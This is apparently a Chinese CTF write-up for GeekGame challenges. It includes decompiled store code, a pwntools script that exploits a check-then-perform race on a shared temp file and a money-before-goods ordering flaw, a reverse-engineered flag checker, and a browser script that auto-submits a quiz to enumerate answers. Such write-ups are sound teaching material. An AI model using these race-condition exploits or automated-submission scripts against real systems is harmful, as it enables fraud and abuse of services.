                62_1  COME_FROM            12  '12'
import os, signal
from urllib.parse import quote
import verify, comm, functools
print = functools.partial(print, flush=True)
TIMEOUT = 60
PLAYER_INIT_MONEY = 500
SALER_INIT_MONEY = 10000
DISCOUNT = 0.9
MAX_LINES = 100

class Commodity:

    def __init__(self, name, desc, price, num):
        self.name = name
        self.desc = desc
        self.price = price
        self.num = num


class Merchant:

    def __init__(self, money):
        self.money = money
        self.possession = dict()

    def gain_commodity(self, commodity, num):
        self.possession[commodity] = self.possession.get(commodity, 0) + num

    def gain_money(self, money):
        self.money += money

    def take_commodity(self, commodity, num):
        new_num = self.possession.get(commodity, 0) - num
        if new_num < 0:
            raise ValueError('no enough commodity')
        self.possession[commodity] = new_num
        if new_num == 0:
            del self.possession[commodity]

    def take_money(self, money):
        if self.money < money:
            raise ValueError('no enough money')
        self.money -= money


def load_commodities():
    global commodities
    commodities = []
    for name, data in comm.comms().items():
        commodities.append(Commodity(name, data['desc'], data['price'], 1))
    else:
        commodities.sort(key=(lambda c: c.price))


def find_commodity(name):
    for c in commodities:
        if c.name == name:
            return c


def build_saler():
    saler = Merchant(SALER_INIT_MONEY)
    for c in commodities:
        num = 1 if c.name == 'flag' else 10
        saler.gain_commodity(c.name, num)
    else:
        return saler


def build_player():
    player = Merchant(PLAYER_INIT_MONEY)
    player.gain_commodity(commodities[0].name, 1)
    return player


def _check_transaction(filename):
    global player
    global saler
    transaction = []
    with open(filename, 'r') as f:
        for line in f.readlines():
            if line.startswith('#'):
                pass
            else:
                line = line.split()
                name, num = line[0], int(line[1])
                c = find_commodity(name)
                if c is None:
                    raise ValueError('%s: invalid name' % name)
                money = c.price * num
                if num > 0:
                    if name not in saler.possession:
                        raise ValueError('%s: not available' % name)
                    else:
                        if name == 'flag':
                            raise ValueError('%s: not for sale' % name)
                        if saler.possession[name] < num:
                            raise ValueError('%s: too much to buy' % name)
                        if player.money < money:
                            raise ValueError('%s: too expensive' % name)
                        transaction.append('buy %d %s ($%d)' % (num, name, money))
                else:
                    money = int(-money * DISCOUNT)
                    if name not in player.possession:
                        raise ValueError('%s: not available' % name)
                    if player.possession[name] < -num:
                        raise ValueError('%s: too much to sale' % name)
                    if saler.money < money:
                        raise ValueError('%s: too expensive' % name)
                    transaction.append('sale %d %s ($%d)' % (-num, name, money))

    return transaction


def _perform_transaction(filename):
    with open(filename, 'r') as f:
        for line in f.readlines():
            if line.startswith('#'):
                pass
            else:
                line = line.split()
                name, num = line[0], int(line[1])
                c = find_commodity(name)
                money = c.price * num
                if num > 0:
                    player.take_money(money)
                    player.gain_commodity(name, num)
                    saler.gain_money(money)
                    saler.take_commodity(name, num)
                else:
                    money = int(-money * DISCOUNT)
                    player.gain_money(money)
                    player.take_commodity(name, -num)
                    saler.take_money(money)
                    saler.gain_commodity(name, -num)


def check_transaction--- This code section failed: ---

 L. 144         0  SETUP_FINALLY        86  'to 86'

 L. 145         2  LOAD_GLOBAL              _check_transaction
                4  LOAD_FAST                'filename'
                6  CALL_FUNCTION_1       1  ''
                8  STORE_FAST               'transaction'

 L. 146        10  LOAD_GLOBAL              print
               12  LOAD_STR                 'You are going to:'
               14  CALL_FUNCTION_1       1  ''
               16  POP_TOP          

 L. 147        18  LOAD_GLOBAL              print
               20  LOAD_STR                 '\n'
               22  LOAD_METHOD              join
               24  LOAD_FAST                'transaction'
               26  CALL_METHOD_1         1  ''
               28  CALL_FUNCTION_1       1  ''
               30  POP_TOP          

 L. 148        32  LOAD_GLOBAL              print
               34  LOAD_STR                 "Type 'y' to confirm: "
               36  LOAD_STR                 ''
               38  LOAD_CONST               ('end',)
               40  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               42  POP_TOP          

 L. 149        44  LOAD_GLOBAL              input
               46  CALL_FUNCTION_0       0  ''
               48  LOAD_STR                 'y'
               50  COMPARE_OP               ==
               52  POP_JUMP_IF_FALSE    68  'to 68'

 L. 150        54  LOAD_GLOBAL              print
               56  LOAD_STR                 'confirmed'
               58  CALL_FUNCTION_1       1  ''
               60  POP_TOP          

 L. 151        62  POP_BLOCK        
               64  LOAD_CONST               True
               66  RETURN_VALUE     
             68_0  COME_FROM            52  '52'

 L. 153        68  LOAD_GLOBAL              print
               70  LOAD_STR                 'cancelled'
               72  CALL_FUNCTION_1       1  ''
               74  POP_TOP          

 L. 154        76  POP_BLOCK        
               78  LOAD_CONST               False
               80  RETURN_VALUE     
               82  POP_BLOCK        
               84  JUMP_FORWARD        134  'to 134'
             86_0  COME_FROM_FINALLY     0  '0'

 L. 155        86  DUP_TOP          
               88  LOAD_GLOBAL              Exception
               90  COMPARE_OP               exception-match
               92  POP_JUMP_IF_FALSE   132  'to 132'
               94  POP_TOP          
               96  STORE_FAST               'e'
               98  POP_TOP          
              100  SETUP_FINALLY       120  'to 120'

 L. 156       102  LOAD_GLOBAL              print
              104  LOAD_FAST                'e'
              106  CALL_FUNCTION_1       1  ''
              108  POP_TOP          

 L. 157       110  POP_BLOCK        
              112  POP_EXCEPT       
              114  CALL_FINALLY        120  'to 120'
              116  LOAD_CONST               False
              118  RETURN_VALUE     
            120_0  COME_FROM           114  '114'
            120_1  COME_FROM_FINALLY   100  '100'
              120  LOAD_CONST               None
              122  STORE_FAST               'e'
              124  DELETE_FAST              'e'
              126  END_FINALLY      
              128  POP_EXCEPT       
              130  JUMP_FORWARD        134  'to 134'
            132_0  COME_FROM            92  '92'
              132  END_FINALLY      
            134_0  COME_FROM           130  '130'
            134_1  COME_FROM            84  '84'

Parse error at or near `LOAD_CONST' instruction at offset 64


def perform_transaction--- This code section failed: ---

 L. 161         0  SETUP_FINALLY        14  'to 14'

 L. 162         2  LOAD_GLOBAL              _perform_transaction
                4  LOAD_FAST                'filename'
                6  CALL_FUNCTION_1       1  ''
                8  POP_TOP          
               10  POP_BLOCK        
               12  JUMP_FORWARD         62  'to 62'
             14_0  COME_FROM_FINALLY     0  '0'

 L. 163        14  DUP_TOP          
               16  LOAD_GLOBAL              Exception
               18  COMPARE_OP               exception-match
               20  POP_JUMP_IF_FALSE    60  'to 60'
               22  POP_TOP          
               24  STORE_FAST               'e'
               26  POP_TOP          
               28  SETUP_FINALLY        48  'to 48'

 L. 164        30  LOAD_GLOBAL              print
               32  LOAD_FAST                'e'
               34  CALL_FUNCTION_1       1  ''
               36  POP_TOP          

 L. 165        38  POP_BLOCK        
               40  POP_EXCEPT       
               42  CALL_FINALLY         48  'to 48'
               44  LOAD_CONST               False
               46  RETURN_VALUE     
             48_0  COME_FROM            42  '42'
             48_1  COME_FROM_FINALLY    28  '28'
               48  LOAD_CONST               None
               50  STORE_FAST               'e'
               52  DELETE_FAST              'e'
               54  END_FINALLY      
               56  POP_EXCEPT       
               58  JUMP_FORWARD         62  'to 62'
             60_0  COME_FROM            20  '20'
               60  END_FINALLY      
             62_0  COME_FROM            58  '58'
             62_1  COME_FROM            12  '12'

 L. 166        62  LOAD_CONST               True
               64  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `CALL_FINALLY' instruction at offset 42


def banner():
    print('Welcome to the store.')
    print('What do you want to do?')
    print("Type 'help' for help.")


if __name__ == '__main__':
    signal.alarm(TIMEOUT)
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    token = input('token: ')
    if verify.validate(token) is None:
        print('wrong token')
        exit()
    comm.set_token(token)
    load_commodities()
    saler = build_saler()
    player = build_player()
    banner()
    while True:
        while True:
            try:
                cmd = input('\n> ')
            except EOFError:
                print('bye')
                break
            else:
                if cmd == 'help':
                    print('help: show help message')
                    print('inspect: show your possessions')
                    print('list: show commodities in the store')
                    print('trade: start a transaction')
                    print()
                    print('an example for trade:')
                    print('jade 1 (buy 1 jade)')
                    print('citrine -1 (sale 1 citrine)')
                    print('END (trade ends)')

        if cmd == 'inspect':
            print('You have $%d, and' % player.money)
            if len(player.possession) == 0:
                print('nothing')
            else:
                for name, num in player.possession.items():
                    c = find_commodity(name)
                    print('%s ($%d * %d): %s' % (name, c.price, num, c.desc))

        else:
            if cmd == 'list':
                print('Saler have $%d, and' % saler.money)
                for name, num in saler.possession.items():
                    c = find_commodity(name)
                    print('%s ($%d * %d)' % (name, c.price, num))

            else:
                if cmd == 'trade':
                    filename = os.path.join('/tmp', quote((token[:5] + token[-5:]), safe='') + '.txt')
                    f = open(filename, 'w')
                    for _ in range(MAX_LINES):
                        line = input()
                        if line == 'END':
                            break
                        else:
                            f.write(line + '\n')
                    else:
                        f.close()

                    if not check_transaction(filename):
                        pass
                    else:
                        if perform_transaction(filename):
                            print('transaction completed')
                        else:
                            print('transaction failed')
                        print('command error')
                        exit()
```

代码有些错误，但是重要的部分基本已经可以读出来了。可以注意到，在输入“trade”指令后，程序会把之后的输入保存在一个临时文件中，然后调用`check_transaction()`打开临时文件检查是否满足交易条件，并确认是否交易（反编译代码中未体现）。如果无错误且确认交易则调用`perform_transaction()`函数打开临时文件执行交易。

这里有两个漏洞可以利用：

首先，临时文件是根据token决定的，对于每个独立的进程都相同，因此可以通过打开两个进程分别读取／写入文件。而检查是否满足条件和执行交易是分为两步进行的，所以可以在进程1中先输入满足条件的交易，在确认前（程序返回`Type 'y' to confirm: `时）打开进程2，在后者输入想达成的交易，再返回进程1确认，就可以执行了。

另一个漏洞是，在执行交易时，先处理金钱，然后再处理商品。因此可以利用这个漏洞空手套白狼，先出售2个（不存在的）flag得到足够的金钱，再购买flag。

在读懂代码之后执行起来就比较简单了，虽然有超时限制，但手动输入完全是可行的。当然也可以用Python的pwn库：

``` python
from pwn import *

context.log_level="debug"

r = remote("prob03.geekgame.pku.edu.cn", 10003)
r.recvuntil("token: ")
r.sendline("xxx") #Token
r.recvuntil("> ")
r.sendline("trade")
r.sendline("citrine 0")
r.sendline("END")
r.recvuntil("Type 'y' to confirm: ")

r2 = remote("prob03.geekgame.pku.edu.cn", 10003)
r2.recvuntil("token: ")
r2.sendline("xxx") #Token
r2.recvuntil("> ")
r2.sendline("trade")
r2.sendline("flag -2")
r2.sendline("END")
r2.recvuntil("> ")

r.sendline("y")
r.recvuntil("> ")
r.sendline("trade")
r.sendline("citrine 0")
r.sendline("END")
r.recvuntil("Type 'y' to confirm: ")

r2.sendline("trade")
r2.sendline("flag 1")
r2.sendline("END")
r2.recvuntil("> ")

r.sendline("y")
r.sendline("inspect")
r.interactive()
```

得到flag：`flag{a_good_merchant_knows_how_to_make_money_00000000}`。

组委会说有彩蛋，尝试把所有东西都买一遍，得到：

```
citrine ($250 * 11): Yellow like fading hope.
flag ($100000 * 1): Spotless flag, showing a strange sentence: flag{a_good_merchant_knows_how_to_make_money_00000000}.
jade ($375 * 10): Dull green like rotting flesh.
onyx ($500 * 10): Black like endless night.
emerald ($750 * 10): Green like molten envy.
sapphire ($1000 * 10): Blue like strangled dreams.
ruby ($1250 * 10): Red like blazing lust.
egg ($2000 * 10): Colorful like boring author.
```

不知道彩蛋是不是最后一个“Colorful like boring author”。

## 未来的机器
### 题目说明
来自未来的人使用未来的高级语言编写了一份源代码，用来自未来的 Flag 传达她对现在的你的问候。她担心现在的你无法理解未来的高级语言，便将其编译到未来的机器语言。她将把未来的可执行文件与未来的机器一同赠送给你。

《未来设备限制出口条例》出台，她不得不把已经贴好的运单从箱子上撕下。她仍希望你能收到她的问候。她将未来的可执行文件转为未来人类可读的未来汇编语言，她用在未来已过时的语言编写了一份汇编解释器，她将这些文件一同传输给你。

但她傲娇。她不愿直接表达自己的问候。她希望你能猜到她的问候。

当你猜到问候语，并将其输入程序后，程序会确认你的猜测是否正确。

**点击 “打开/下载题目” 下载题目附件**

[打开/下载题目](https://geekgame.pku.edu.cn/media/c343aba2-ebbd-4a7a-b4b4-f139ba176a23.zip)

### 解法
题目不太难，只是需要有些耐心来一行行读代码，相当于人肉解释器。

先搞清楚`runner.py`在干什么。内存中共有三个部分：GLOBAL、LOCAL、MEMORY，对应全局变量、局部变量、内存。各种运算符需要用到STACK（栈）。

然后手动将`asm.txt`转换成Python语句：

``` python
m = [0] * 0x15b9
g = [0] * 22
v = [0] * 117
g[18] = 4982
g[19] = 5400
g[20] = 4986
g[21] = 5000
key = '.q~03QKLNSp"s6AQtEW<=MNv9(ZMYntg2N9hSe5=k'.encode()
for i in range(len(key)):
    m[5400 + i * 4] = key[i]
m[4986] = len(key)
fla = 'flag{123456789abcdefghijklmnopqrstuvwxyz}'.encode()
for i in range(len(fla)):
    m[5000 + i * 4] = fla[i]
m[4982] = len(fla)

def main():
    global g, v, m
    g[16] = 16
    v[111] = 114514
    stack = [16]
    m[3776] = 0
    m[1952] = 0
    while True:
        v[1] = m[3776]
        v[23] = int(v[1] < 96)
        if v[23] == 0:
            break
        v[34] = m[3776]
        v[45] = m[3776]
        v[56] = 1952 + int(v[45] << 2)
        m[v[56]] = v[34]
        v[67] = m[3776]
        v[78] = v[67] + 1
        m[3776] = v[78]

    m[3776] = 1
    while True:
        v[89] = m[3776]
        v[100] = int(v[89] < 96)
        if v[100] == 0:
            break
        v[2] = v[111]
        v[13] = v[2] * 1919
        v[15] = v[13] + 7
        v[16] = (v[15] % 334363) & -1
        v[111] = v[16]
        v[17] = v[111]
        v[18] = m[3776]
        v[19] = (v[17] % v[18]) & -1
        v[113] = v[19]
        v[20] = v[113]
        v[21] = 1952 + (v[20] << 2)
        v[22] = m[v[21]]
        v[114] = v[22]
        v[24] = m[3776]
        v[25] = 1952 + (v[24] << 2)
        v[26] = m[v[25]]
        v[27] = v[113]
        v[28] = 1952 + (v[27] << 2)
        m[v[28]] = v[26]
        v[29] = v[114]
        v[30] = m[3776]
        v[31] = 1952 + (v[30] << 2)
        m[v[31]] = v[29]
        v[32] = m[3776]
        v[33] = v[32] + 1
        m[3776] = v[33]

    m[3776] = 0
    while True:
        v[35] = m[3776]
        v[36] = m[g[18]]
        v[37] = int(v[35] < v[36])
        if v[37] == 0:
            break
        v[38] = m[3776]
        v[39] = g[21] + (v[38] << 2)
        v[40] = m[v[39]]
        v[41] = v[40] - 32
        v[113] = v[41]
        v[42] = v[113]
        v[43] = int(v[42] < 0)
        v[44] = v[113]
        v[46] = int(v[44] >= 96)
        v[112] = v[43] | v[46]
        if v[112]:
            v[115] = 10
            break
        v[47] = v[113]
        v[48] = 1952 + (v[47] << 2)
        v[49] = m[v[48]]
        v[50] = m[3776]
        v[51] = v[49] + v[50]
        v[52] = (v[51] % 96) & -1
        v[53] = v[52] + 32
        v[54] = m[3776]
        v[55] = 1152 + (v[54] << 2)
        m[v[55]] = v[53]
        v[57] = m[3776]
        v[58] = v[57] + 1
        m[3776] = v[58]

    if v[115] == 10:
        v[0] = -1
        v[14] = v[0]
        g[16] = v[116]
        return v[14]


    m[3776] = 0
    while True:
        v[59] = m[3776]
        v[60] = m[g[18]]
        v[61] = int(v[59] < v[60])
        if v[61] == 0:
            break
        v[62] = m[3776]
        v[63] = m[3776]
        v[64] = 2336 + (v[63] << 2)
        m[v[64]] = v[62]
        v[65] = m[3776]
        v[66] = v[65] + 1
        m[3776] = v[66]

    m[3776] = 1
    while True:
        v[68] = m[3776]
        v[69] = m[g[18]]
        v[70] = int(v[68] < v[69])
        if v[70] == 0:
            break
        v[71] = v[111]
        v[72] = v[71] * 1919
        v[73] = v[72] + 7
        v[74] = (v[73] % 334363) & -1
        v[111] = v[74]
        v[75] = v[111]
        v[76] = m[3776]
        v[77] = (v[75] % v[76]) & -1
        v[113] = v[77]
        v[79] = v[113]
        v[80] = 2336 + (v[79] << 2)
        v[81] = m[v[80]]
        v[114] = v[81]
        v[82] = m[3776]
        v[83] = 2336 + (v[82] << 2)
        v[84] = m[v[83]]
        v[85] = v[113]
        v[86] = 2336 + (v[85] << 2)
        m[v[86]] = v[84]
        v[87] = v[114]
        v[88] = m[3776]
        v[90] = 2336 + (v[88] << 2)
        m[v[90]] = v[87]
        v[91] = m[3776]
        v[92] = v[91] + 1
        m[3776] = v[92]

    m[3776] = 0
    while True:
        v[93] = m[3776]
        v[94] = m[g[18]]
        v[95] = int(v[93] < v[94])
        if v[95] == 0:
            break
        v[96] = m[3776]
        v[97] = 1152 + (v[96] << 2)
        v[98] = m[v[97]]
        v[99] = m[3776]
        v[101] = 2336 + (v[99] << 2)
        v[102] = m[v[101]]
        v[103] = 1552 + (v[102] << 2)
        m[v[103]] = v[98]
        v[104] = m[3776]
        v[105] = v[104] + 1
        m[3776] = v[105]

    v[106] = m[g[18]]
    v[107] = m[g[20]]
    v[108] = int(v[106] != v[107])
    if v[108]:
        v[0] = 0
        v[14] = v[0]
        g[16] = v[116]
        return v[14]

    m[3776] = 0
    while True:
        v[109] = m[3776]
        v[110] = m[g[18]]
        v[3] = int(v[109] < v[110])
        if v[3] == 0:
            v[115] = 28
            break
        v[4] = m[3776]
        v[5] = 1552 + (v[4] << 2)
        v[6] = m[v[5]] 
        v[7] = m[3776]
        v[8] = g[19] + (v[7] << 2)
        v[9] = m[v[8]]
        v[10] = int(v[6] != v[9])
        if v[10]:
            v[115] = 26
            break
        v[11] = m[3776]
        v[12] = v[11] + 1
        m[3776] = v[12]

    if v[115] == 26:
        v[0] = 0
        v[14] = v[0]
        g[16] = v[116]
        return v[14]
    else:
        if v[115] == 28:
            v[0] = 1
            v[14] = v[0]
            g[16] = v[116]
            return v[14]
    return 0

result = main()
if result == -1:
    print("ERROR!")
elif result == 0:
    print("WRONG!")
else:
    print("RIGHT!")
```

分析源代码，`m[3776]`起到指针的作用，而主要占用的内存区域分别为1152、1552、1952、2336四部分。flag与key的代码长度相同。当1552的内存区域与key完全相同时运行成功。将代码简化，并给变量命名，得到下面的语句：

```python
import struct

m1152 = [0 for i in range(96)]
m1552 = [0 for i in range(96)]
m1952 = [0 for i in range(96)]
m2336 = [0 for i in range(96)]
key = '.q~03QKLNSp"s6AQtEW<=MNv9(ZMYntg2N9hSe5=k'.encode()
key_len = len(key)
fla = 'flag{123456789abcdefghijklmnopqrstuvwxyz}'.encode()
fla_len = len(fla)
pos = 0
seed = 114514

for pos in range(0, 96):
    m1952[pos] = pos

for pos in range(1, 96):
    seed = ((seed * 1919 + 7) % 334363) & -1
    v113 = (seed % pos) & -1
    m1952[v113], m1952[pos] = m1952[pos], m1952[v113]

for pos in range(0, fla_len):
    if fla[pos] < 32 or fla[pos] >= 128:
        raise ValueError("包含不可打印的 ASCII 字符：\\" + hex(fla[pos])[1:])
    m1152[pos] = (((m1952[fla[pos] - 32] + pos) % 96 ) & -1) + 32

for pos in range(0, fla_len):
    m2336[pos] = pos

for pos in range(1, fla_len):
    seed = ((seed * 1919 + 7) % 334363) & -1
    v113 = (seed % pos) & -1
    m2336[v113], m2336[pos] = m2336[pos], m2336[v113]

for pos in range(0, fla_len):
    m1552[m2336[pos]] = m1152[pos]

with open("m1952.bin", "wb") as f:
    f.write(bytes(m1952))

with open("m1152.bin", "wb") as f:
    f.write(bytes(m1152))

with open("m2336.bin", "wb") as f:
    f.write(bytes(m2336))

with open("m1552.bin", "wb") as f:
    f.write(bytes(m1552))
```

可以发现m1952和m2336区域与flag内容无关，先求出这两部分；m1552区域需要与key相同，因此对其进行赋值为key，然后根据运算语句反推m1152区域，再由m1152区域反推flag。反推的代码如下：

``` python
for pos in range(0, fla_len):
    m1552[pos] = key[pos]

for pos in range(0, fla_len):
    m1152[pos] = m1552[m2336[pos]]

n_fla = ""
for pos in range(0, fla_len):
    n_fla += chr(m1952.index((m1152[pos] - 32 - pos + 96) % 96) + 32)

print(n_fla)
```

得到flag：`flag{W4SM_1S_s0_fun_but_1t5_subs3t_isN0T}`。

## 无法预料的问答
### 题目说明
> Now, it's up to you to do the next one.
{: lang="en" }

命题人 <span class="you-name">You</span> 酱收到了来自组委会的投诉：“关于小北问答这道题，怎么几个小时才能提交一次？选手们反映说这样不讲武德。” <span class="you-name">You</span> 酱很无奈，因为如果不限制提交频率，万一有人用爬虫枚举答案，就成命题事故了。

无论如何，收到投诉不能不处理。<span class="you-name">You</span> 酱决定再出一道问答题，不再限制提交频率……呃，这样服务器大概撑不住，限制一秒可以提交一次总行吧。

“既然放开了提交频率，就需要把题目出难一点，干脆都出只有我自己知道答案的题，这样就没人能做出来了。” —— <span class="you-name">You</span> 酱

**点击 “打开/下载题目” 进入题目网页**

[打开/下载题目](http://prob11.geekgame.pku.edu.cn/)

### 解法
这个题目相当于在服务器端给Emoji赋值，然后要求我们选出给定几个Emoji中最大的。

我的思路是，在本地维护一个有序列表，每次提交列表中序号最大的Emoji（记为`lastSelectedEmoji`，若所有Emoji都不存在于列表中则选择第一个），保存所有选项（记为`lastEmoji`），然后根据返回值调整：如果选择正确，则把`lastSelectedEmoji`移动到`lastEmoji`中最大Emoji的后一个；如果选择错误，则把`lastSelectedEmoji`移动到`lastEmoji`中最大Emoji的前一个。

在多次提交后，本地的有序列表会逐渐趋近于服务器端的列表，但不能保证完全相同。

因为此题在浏览器中进行，为了省事我直接用了[Tampermonkey](https://www.tampermonkey.net/)运行[JavaScript](https://www.javascript.com/)，代码如下：

``` javascript
/* global $ */
(function () {
    let choices = $(".radio input[type='radio']");
    let lastEmoji = localStorage.lastEmoji.split("|");
    let lastSelectedEmoji = localStorage.lastSelectedEmoji;
    let emojiSort = JSON.parse(localStorage.emojiSort || "[]");
    let emojiSortBefore = emojiSort.join("");
    let lastResult;
    let results = JSON.parse(localStorage.results || "[]");
    for (let i = 0; i < lastEmoji.length; i++) {
        if ((lastEmoji[i] != lastSelectedEmoji) && (emojiSort.indexOf(lastEmoji[i]) == -1)) {
            emojiSort.splice(0, 0, lastEmoji[i]);
        }
    }
    let otherMaxPos = Math.max(...lastEmoji.filter(x=>x!=lastSelectedEmoji).map(x=>emojiSort.indexOf(x)));
    let selectedPos = emojiSort.indexOf(lastSelectedEmoji);
    if ($(".alert").text().toLowerCase().indexOf("this is bad") > -1) {
        // 上一个选择的 Emoji 不是最大的
        lastResult = false;
        if (selectedPos > otherMaxPos) {
            if (selectedPos > -1) {
                emojiSort.splice(selectedPos, 1);
            }
            emojiSort.splice(otherMaxPos, 0, lastSelectedEmoji);
        }
        if (emojiSort.indexOf(lastSelectedEmoji) == -1) {
            emojiSort.splice(0, 0, lastSelectedEmoji);
        }
        let emojiSortAfter = emojiSort.join("");
        if (emojiSortBefore == emojiSortAfter) {
            throw '咋回事';
        }
    } else if ($(".alert").text().toLowerCase().indexOf("回答正确") > -1) {
        // 上一个选择的 Emoji 是最大的
        lastResult = true;
        if (selectedPos < otherMaxPos) {
            if (selectedPos > -1) {
                emojiSort.splice(selectedPos, 1);
            }
            emojiSort.splice(otherMaxPos + 1, 0, lastSelectedEmoji);
        }
    }
    results.push(lastEmoji.join("") + "|" + lastSelectedEmoji + "|" + (+lastResult));
    localStorage.results = JSON.stringify(results);
    localStorage.emojiSort = JSON.stringify(emojiSort);
    console.log(emojiSort.join(""));

    let sorted = choices.toArray().map(x=>[x, emojiSort.indexOf(x.value)]).sort((x,y)=>(y[1] - x[1]));
    sorted[0][0].checked = true;

    $("form").on("submit", function () {
        localStorage.lastEmoji = choices.toArray().map(x=>x.value).join("|");
        localStorage.lastSelectedEmoji = choices.toArray().filter(x=>x.checked)[0].value;
    });

    setTimeout(function () {
        $("form").submit();
    }, 1000);
})();
```

直到得到flag前我的序列如下：

``` json
["😻","👎","😡","🦈","🐜","🤞","👉","🤤","👹","👍","🐐","🤙","👩‍🦱","😴","🤭","🦦","🐥","🐘","😆","👺","👇","😊","💂‍♀️","😏","🐓","🧠","🤛","😕","😿","👾","🤡","🐔","👊","😦","🙏","👦","🦒","🐢","👌","🦢","🐕‍🦺","😩","🦩","😓","👮‍♀️","😹","🦞","🦷","😋","🤠","🐮","👼","👩‍🦰","🦝","🧑","🤘","🧞‍♂️","🦃","🦚","😲","😞","🦠","🐱‍👓","😗","🐼","🧓"]
```

得到flag：`flag{y0uAr3_S00_K1raK1ra_00000000}`。

## 计算概论B
### 题目说明
又㕛叒叕有人拿着计概 B 的代码来问 <span class="you-name">You</span> 酱了，这不是什么稀奇的事情。

不过，这次的代码确实有点意思。因为这个人打算尝试一个算法，却不慎在运行完之后把输入文件删掉了。所幸这个人用的是 Jupyter Notebook，所以还保留着算法的输出。

你能帮忙还原出被删掉的输入文件吗？<span class="you-name">You</span> 酱愿意用输入文件中的一个 Flag 作为酬谢。

**点击 “打开/下载题目” 下载题目附件**

[打开/下载题目](https://geekgame.pku.edu.cn/media/78c01ef5-bcf6-406c-bb50-e533cdd6ac43.zip)

### 解法
`game.ipynb`可以用Visual Studio Code打开，源代码如下：

``` python
import pickle
from collections import Counter
import binascii

# read text to be encoded
with open('text.txt') as f:
    text = f.read()
    raw_text = binascii.unhexlify(text.encode())
    assert b'flag{' in raw_text
    text = text[::-1]

# read translation table
with open('table.pickle', 'rb') as f:
    table = pickle.load(f)

# check translation table
for char1, code1 in table:
    for char2, code2 in table:
        if char1!=char2:
            assert not code1.startswith(code2)

# check char frequency
cnt = Counter()
for c in text:
    cnt[c] += 1
cnt

# encode text
text.translate({ord(k):v for k,v in table})
```

重要的输出：

``` python
Counter({'e': 70,
         '2': 274,
         '9': 81,
         '4': 124,
         '7': 311,
         '1': 77,
         '6': 649,
         'd': 35,
         'f': 69,
         '0': 208,
         '5': 119,
         'c': 35,
         'a': 3,
         '8': 55,
         '3': 94,
         'b': 6})
```

```python
'1000001110011011010010110001111001001101110101011111111000011001111100101111100111111110000110011111011110001111001001110011110000111011100111100010110010100110000110011110101011010010100001110010110110011111001011110001011001001110001110101010100111100001101110101011111111010100110000110010101001111101111000111000101000011011110011111011010000110100111000011100011100001100101010010111001111100001101011110111010100101001011001111100101111001111000011100001101011111001001110010011010111100101100001110000111001111000011010011100001100111010101111111100001110000111000111001011000011101111000011100111101001101011110010110000111000011100011110010011111111110011101010101100001111110101111000011001010110010011011101010111111110000110011111110110011110100101100011111101100111101110100111101001100001110011101100011101001101011110100101000011100000110010101001111101111000111000101000011011110011111011010000111001011111000111011101001111111010011110010101000011010011100001110001110000110010101100101011101011110101111011110100101010101010011110100101000011100111011000011100011110010011000011100001110011110000110100110011110111110011110111010010110010101001111010011000011001010110011110000110100101100111100001110010110111001110101001011001111001011100111110010111100010110010011100111100101010000110100111000011100011100001100111100101110000111000111101110011111001011110011110000110010101010010110011110000111111010111100001100111100101010011101100011100101100111101111000011100000110100101100111100001111110101111000011111111110101111000011100111011000011100001100111100010100001110001110000110011111001010111100011110010011000011010010110101110000110100111001111010011000011001111010101100001101001110000111000111000011100101101110010011010101101001011001111011101010111110111100101111100011100001110000111000111000011010010100101010011101100101001100001100101011000111101101000011001111001010100111011000111001011001111011110000111001011011010010110011110000111011110000111001111010010110000110011110100101100011100010100001101110101011110000111011110000111001111010010101010111011110011110111011001110100010101011110010110000110111010011110100111001111001010110000110101111001011000011010010110101110000110100111001111010011000011001111010101100001100111110010011100111101001010000110011110101011010010100001101001011000111000011100000111011110000111001111010011010111100101100001110000111000111100100111111111100111010101011000011001010110001110000111000011101101010111110000111001010111000011001111100100111000111001011001111011110000110010101100111101010110100101000011100000110110010001100101001100101000100100000111000011100111100001110010011010101101001011001111011101010111110111100101111100011100001100101011001111010101100001110111100001110011110111110011110111010010110010101001111010011000011011011001010100111101001101011110010110000111001110100101110000111000111010011100001100111010100110011110111010000111001001100111011001001110011111000011100111110010011000011111101011110000111000011010111110011110100101001011001110101110101001010010101100001101011110010110000110011110101011010010100001101110101011111111000011010011010111101010110100101001111100100110000111000111011011000011011101001111000101100011100010100001100111101010110100101000011010011001111010101100101011001111100101111011110011101000101000011001111010101100001110010010110000111000111100100111111111100111010101011010110011100111011000100101000100101000111001111011101010110011001010110001001001011001100101011000100100101011010010101011001100101010100101100011101110110111100001101011110010110101100111011010000010101101100101011011011110001111001011111111000011100000111001001110011110101011000011010111101001010000110011111001001110001110010110000111001001101010110100101100111101110101011111011110010111110001110000110011110101011010010100001110010110111000011100011100101100001101010110010101100011101110101001010000110011110101011010010100001101001011001111010101100001100101010111010011110001011000111000101000011001111010101101001010000111111010111100001100111110000110101111000011001010110001110000111000001110010011001111100101111011110101111011101000101000011001111010101101001010000111000011010111100001100101011011110000111001111010101100101101001011000111011101001011001010100001100101011001111010101100001110011101100011110110110001110000111011110000111001111101101010111101110101010110100101000011101111000011100111101001010111011000111010010100101010000110100111000011100011100001110010011100011101010101001111000011001111010101101001010000110111010101111111100001110111100001110011111001110101001100111010100101001010100001101001010111011000111010010100101010000110101111010010100001100111111101100011101010110000110100111010110011110101011000011010011001111100101001011001111100101111100011100111101110100001101001110011111110110001110100110000111001011011001111001010101011111001011110010110000111000111000011010111101001010000111011010011110111010100110000111001001101110100111101001010000110011110101011010010100001100101011000111000011100000111000011010111110011110100101001110110010111101011110010101000011010010100101010011110111100001100111101010110100101000011101101001111100001110010101110000110011111001001110011110100101000011010010110001110101011010010100001101001011000111000011001111100001101011110000110101111100001100001101001011000111010101101001010000110010101100111100001110010011100111101010110000111001011111001011110011110100101000011010010110101110000110100111001111010011000011011101010111100101010010101001111111101011110111010001010000110010101100111101010110000110100101100011101010111011010000111000001110010011001111100101111011110101111011101000101000011011011001111010011010111100101100001101001010010101001111100101111100101111100011110010011001010101101100001100111101010110100101000011010111101001010000111000011010111110011110100101001110110010111101011110010101000011100011100001101001110000111001111111100001101011110100101000011010011001111100111101110101001010000110011111001011110010111000011001110100001110011101100100110000111001011011010010100111010101111000011100111011000111101101000011100111010010101100011100111100001100111101010110100101000011001010110001111011010000110100101010101110111001110101011110101011010010100001100111101010110000110100101100011101010111011010000110111010101111111100001110111100001110011110100101000101010111100001110000011100100111000111010101010011110000111001011111000111100001110011111111000011001111010101101001010000111011110000111001111100101011110001110100101000011111101011110000110100111000111001111010010100101011000011100111100001110010011001111100101111011110101111011101000101000011010010110010111100111010010111001111111111111001111010011000011100011100001110111100001110011111110110010111